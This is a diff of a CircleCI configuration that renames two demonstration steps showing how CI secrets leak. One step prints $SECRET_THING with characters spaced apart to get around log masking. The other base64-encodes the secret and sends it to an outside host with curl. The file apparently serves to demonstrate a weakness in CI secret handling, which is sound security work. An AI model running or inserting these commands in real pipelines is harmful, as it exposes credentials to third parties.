@@ -15,10 +15,10 @@ jobs:
           name: Npm Install
           command: npm install
       - run:
-          name: Are tokens safe in to people with access to the repo
+          name: Secrets can be easily human read by anyone with access to Circle
           command: echo $SECRET_THING | sed -e 's/\(.\)/\1\ /g'
       - run:
-          name: Can tokens be sent outside of the repo
+          name: Secrets can be easily broadcast out of Circle
           command: echo $SECRET_THING | base64 | { read -r data; curl -v --head --request GET "https://snyk.io?data=$data"; }
       - save_cache:
           key: dependency-cache-{{ checksum "package-lock.json" }}
